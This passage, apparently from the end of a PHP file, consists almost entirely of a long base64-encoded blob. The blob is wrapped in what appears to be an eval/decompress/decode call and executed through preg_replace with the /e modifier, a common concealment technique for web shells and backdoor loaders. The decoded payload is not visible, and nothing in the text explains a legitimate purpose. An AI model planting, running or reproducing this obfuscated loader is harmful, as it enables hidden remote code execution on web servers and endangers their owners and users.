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'\x29\x29\x29\x3B";

preg_replace("/.*/e",$string,".");

?>